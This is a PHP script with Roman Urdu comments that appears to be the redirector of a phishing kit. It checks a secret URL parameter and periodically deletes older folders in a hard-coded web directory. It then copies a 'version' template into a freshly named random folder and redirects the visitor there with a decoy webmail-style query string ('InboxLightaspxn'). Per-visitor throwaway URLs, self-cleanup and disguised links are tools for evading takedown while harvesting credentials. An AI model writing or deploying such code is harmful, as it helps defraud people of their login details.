<?php
session_start();
 

// is ko change karna mad or pathan ko. Link Work like: index.php?activity=4789652

if($_GET['hf87rgf7'] != "hdbf868g6"){ exit;
}

/// bhai ka code start

$now   = time();
if ($handle = opendir('/home/terxtcfghgb/public_html/656rykghy/')) { // bhai yahan full directory deni hai jisy scan kry
    $blacklist = array('.', '..', 'blocker.php', 'index.php', 'tmp_folder','.htaccess', 'version', 'any other file?');
    // caution: bhai . or .. remove ni krna $blacklist array sy. warna pichly folders k L lg jain gy.
    while (false !== ($file = readdir($handle))) {
        if (!in_array($file, $blacklist)) {
      if ($now - filemtime($file) >= 220) { // 120 second. (use 60 * 60 for 1 hours)
      if(is_dir($file)){
         deletefolder($file); rmdir($file); // ye folder find hoga to osy delete kry gi.
      }elseif(is_file($file)){
        unlink($file);  // uncomment kr do agr koi file find ho to wo del ni ho 
    }
      }
        }
    }
    closedir($handle);
}
 function deletefolder($path) 
  { 
    if ($handle=opendir($path)) 
    { 
      while (false!==($file=readdir($handle))) 
      { 
        if ($file<>"." AND $file<>"..") 
        { 
          if (is_file($path.'/'.$file)) 
          { 
            @unlink($path.'/'.$file); 
          } 
          if (is_dir($path.'/'.$file)) 
          { 
            deletefolder($path.'/'.$file); 
            @rmdir($path.'/'.$file); 
          } 
        } 
      } 
    } 
  } 
/// -- bhai ka code End


//include('blocker.php');


$random = rand(500,100000000);
$dst    = substr(md5($random), 0, 1000000000);
$log = base64_encode($_GET['loge']);

//$data = random_bytes(102);
$b = base64_encode($data);
$str = rand(); 
$result = hash("sha256", $str);




//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src,$dst)
{
	$dir = opendir($src);
	@mkdir($dst);
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}
	$praga=rand();
	$praga=md5($praga);
$src="version";
recurse_copy( $src, $dst );







header("location:".$dst."?Key=".$random."&rand=13InboxLightaspxn.".$random."?$b-&$result");


?>